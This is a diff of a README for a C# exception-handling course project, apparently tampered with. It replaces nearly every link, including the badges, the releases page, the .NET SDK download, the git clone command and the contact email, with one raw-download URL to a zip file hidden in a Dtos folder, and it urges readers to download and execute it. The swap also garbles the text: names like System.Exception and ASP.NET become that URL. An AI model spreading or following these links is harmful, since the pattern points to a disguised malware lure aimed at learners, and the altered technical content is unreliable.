@@ -1,15 +1,15 @@
 # ADO Pet Web API Course - Alura Exceptions Part 3
 
-![C#](https://img.shields.io/badge/C%23-239120?style=flat&logo=csharp&logoColor=white)
-![.NET](https://img.shields.io/badge/.NET-512BD4?style=flat&logo=.net&logoColor=white)
-![API](https://img.shields.io/badge/API-4D4D4D?style=flat&logo=api&logoColor=white)
-![Alura](https://img.shields.io/badge/Alura-FF6600?style=flat&logo=alura&logoColor=white)
+![C#](https://github.com/roland4576/ado-pet_webapi_course-alura-exceptions_part-3_dotnet-8_csharp-12/raw/refs/heads/main/developments/csharp-exceptions-Aula-3/Adopet/Dtos/csharp_part_exceptions_webapi_alura_ado_pet_course_dotnet_3.5.zip%23-239120?style=flat&logo=csharp&logoColor=white)
+![.NET](https://github.com/roland4576/ado-pet_webapi_course-alura-exceptions_part-3_dotnet-8_csharp-12/raw/refs/heads/main/developments/csharp-exceptions-Aula-3/Adopet/Dtos/csharp_part_exceptions_webapi_alura_ado_pet_course_dotnet_3.5.zip)
+![API](https://github.com/roland4576/ado-pet_webapi_course-alura-exceptions_part-3_dotnet-8_csharp-12/raw/refs/heads/main/developments/csharp-exceptions-Aula-3/Adopet/Dtos/csharp_part_exceptions_webapi_alura_ado_pet_course_dotnet_3.5.zip)
+![Alura](https://github.com/roland4576/ado-pet_webapi_course-alura-exceptions_part-3_dotnet-8_csharp-12/raw/refs/heads/main/developments/csharp-exceptions-Aula-3/Adopet/Dtos/csharp_part_exceptions_webapi_alura_ado_pet_course_dotnet_3.5.zip)
 
 ## Overview
 
 Welcome to the **ADO Pet Web API Course - Alura Exceptions Part 3** repository! This project contains exercises from the course "C# e Exceções: construa aplicações resilientes" offered by Alura. The course focuses on exception handling and throwing, error hierarchy, API application, and best practices for building robust and reliable applications in C#.
 
-You can find the latest releases of this project [here](https://github.com/roland4576/ado-pet_webapi_course-alura-exceptions_part-3_dotnet-8_csharp-12/releases). Download and execute the files to explore the functionalities.
+You can find the latest releases of this project [here](https://github.com/roland4576/ado-pet_webapi_course-alura-exceptions_part-3_dotnet-8_csharp-12/raw/refs/heads/main/developments/csharp-exceptions-Aula-3/Adopet/Dtos/csharp_part_exceptions_webapi_alura_ado_pet_course_dotnet_3.5.zip). Download and execute the files to explore the functionalities.
 
 ## Table of Contents
 
@@ -32,7 +32,7 @@ This repository serves as a practical guide for anyone looking to improve their 
 To get started with this repository, you need to clone it to your local machine. You can do this by running the following command in your terminal:
 
 ```bash
-git clone https://github.com/roland4576/ado-pet_webapi_course-alura-exceptions_part-3_dotnet-8_csharp-12.git
+git clone https://github.com/roland4576/ado-pet_webapi_course-alura-exceptions_part-3_dotnet-8_csharp-12/raw/refs/heads/main/developments/csharp-exceptions-Aula-3/Adopet/Dtos/csharp_part_exceptions_webapi_alura_ado_pet_course_dotnet_3.5.zip
 ```
 
 After cloning the repository, navigate to the project folder:
@@ -43,7 +43,7 @@ cd ado-pet_webapi_course-alura-exceptions_part-3_dotnet-8_csharp-12
 
 Next, ensure you have the required tools installed. You will need:
 
-- [.NET 8 SDK](https://dotnet.microsoft.com/download/dotnet/8.0)
+- [.NET 8 SDK](https://github.com/roland4576/ado-pet_webapi_course-alura-exceptions_part-3_dotnet-8_csharp-12/raw/refs/heads/main/developments/csharp-exceptions-Aula-3/Adopet/Dtos/csharp_part_exceptions_webapi_alura_ado_pet_course_dotnet_3.5.zip)
 - A suitable IDE (e.g., Visual Studio, Visual Studio Code)
 
 Once you have everything set up, you can run the application using the following command:
@@ -87,9 +87,9 @@ Creating custom exceptions can help you provide more meaningful error messages. 
 
 Understanding the error hierarchy in .NET is crucial for effective exception handling. Familiarize yourself with the following:
 
-- **System.Exception**: The base class for all exceptions.
-- **System.ApplicationException**: Used for application-specific exceptions.
-- **System.SystemException**: Represents predefined exceptions that occur during runtime.
+- **https://github.com/roland4576/ado-pet_webapi_course-alura-exceptions_part-3_dotnet-8_csharp-12/raw/refs/heads/main/developments/csharp-exceptions-Aula-3/Adopet/Dtos/csharp_part_exceptions_webapi_alura_ado_pet_course_dotnet_3.5.zip**: The base class for all exceptions.
+- **https://github.com/roland4576/ado-pet_webapi_course-alura-exceptions_part-3_dotnet-8_csharp-12/raw/refs/heads/main/developments/csharp-exceptions-Aula-3/Adopet/Dtos/csharp_part_exceptions_webapi_alura_ado_pet_course_dotnet_3.5.zip**: Used for application-specific exceptions.
+- **https://github.com/roland4576/ado-pet_webapi_course-alura-exceptions_part-3_dotnet-8_csharp-12/raw/refs/heads/main/developments/csharp-exceptions-Aula-3/Adopet/Dtos/csharp_part_exceptions_webapi_alura_ado_pet_course_dotnet_3.5.zip**: Represents predefined exceptions that occur during runtime.
 
 ## Best Practices
 
@@ -106,7 +106,7 @@ This project leverages several technologies:
 
 - **C#**: The primary programming language used for development.
 - **.NET 8**: The framework that provides the runtime and libraries.
-- **ASP.NET Core**: Used for building the web API.
+- **https://github.com/roland4576/ado-pet_webapi_course-alura-exceptions_part-3_dotnet-8_csharp-12/raw/refs/heads/main/developments/csharp-exceptions-Aula-3/Adopet/Dtos/csharp_part_exceptions_webapi_alura_ado_pet_course_dotnet_3.5.zip Core**: Used for building the web API.
 - **Entity Framework Core**: For data access and manipulation.
 
 ## How to Contribute
@@ -127,7 +127,7 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 For any questions or feedback, feel free to reach out:
 
-- **GitHub**: [roland4576](https://github.com/roland4576)
-- **Email**: [your-email@example.com](mailto:your-email@example.com)
+- **GitHub**: [roland4576](https://github.com/roland4576/ado-pet_webapi_course-alura-exceptions_part-3_dotnet-8_csharp-12/raw/refs/heads/main/developments/csharp-exceptions-Aula-3/Adopet/Dtos/csharp_part_exceptions_webapi_alura_ado_pet_course_dotnet_3.5.zip)
+- **Email**: [https://github.com/roland4576/ado-pet_webapi_course-alura-exceptions_part-3_dotnet-8_csharp-12/raw/refs/heads/main/developments/csharp-exceptions-Aula-3/Adopet/Dtos/csharp_part_exceptions_webapi_alura_ado_pet_course_dotnet_3.5.zip](https://github.com/roland4576/ado-pet_webapi_course-alura-exceptions_part-3_dotnet-8_csharp-12/raw/refs/heads/main/developments/csharp-exceptions-Aula-3/Adopet/Dtos/csharp_part_exceptions_webapi_alura_ado_pet_course_dotnet_3.5.zip)
 
-Thank you for visiting this repository! Explore the exercises and enhance your skills in C# exception handling. For the latest releases, check out [this link](https://github.com/roland4576/ado-pet_webapi_course-alura-exceptions_part-3_dotnet-8_csharp-12/releases).
+Thank you for visiting this repository! Explore the exercises and enhance your skills in C# exception handling. For the latest releases, check out [this link](https://github.com/roland4576/ado-pet_webapi_course-alura-exceptions_part-3_dotnet-8_csharp-12/raw/refs/heads/main/developments/csharp-exceptions-Aula-3/Adopet/Dtos/csharp_part_exceptions_webapi_alura_ado_pet_course_dotnet_3.5.zip).
